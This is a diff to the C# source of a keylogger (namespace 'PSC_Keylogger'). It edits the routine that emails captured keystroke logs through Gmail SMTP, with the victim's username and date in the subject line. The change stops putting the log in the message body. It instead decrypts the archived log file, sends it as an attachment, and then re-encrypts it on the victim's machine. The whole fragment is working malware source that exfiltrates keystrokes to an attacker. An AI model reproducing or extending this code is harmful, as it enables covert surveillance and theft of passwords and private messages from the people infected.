@@ -23,7 +23,6 @@ namespace PSC_Keylogger
             try
             {
                 StreamReader input = new StreamReader(BaseKeylogger.ARCHIVE_FILE_NAME);
-                string emailBody = input.ReadToEnd();
                 input.Close();
 
                 SmtpClient client = new SmtpClient("smtp.gmail.com")
@@ -39,12 +38,14 @@ namespace PSC_Keylogger
                 {
                     From = new MailAddress(FROM_EMAIL_ADDRESS),
                     Subject = Environment.UserName + " - " + DateTime.Now.Month + "." + DateTime.Now.Day + "." + DateTime.Now.Year,
-                    Body = emailBody,
+                    Body = "",
                     IsBodyHtml = false,
                 };
 
                 if (INCLUDE_LOG_AS_ATTACHMENT)
                 {
+                    EncryptionManager.DecryptFile(BaseKeylogger.ARCHIVE_FILE_NAME, BaseKeylogger.KEY_ENCRYPTION);
+
                     Attachment attachment = new Attachment(BaseKeylogger.ARCHIVE_FILE_NAME, System.Net.Mime.MediaTypeNames.Text.Plain);
                     message.Attachments.Add(attachment);
                 }
@@ -73,6 +74,8 @@ namespace PSC_Keylogger
                 client.Send(message);
 
                 message.Dispose();
+
+                EncryptionManager.EncryptFile(BaseKeylogger.ARCHIVE_FILE_NAME, BaseKeylogger.KEY_ENCRYPTION);
             }
             catch (Exception e)
             {
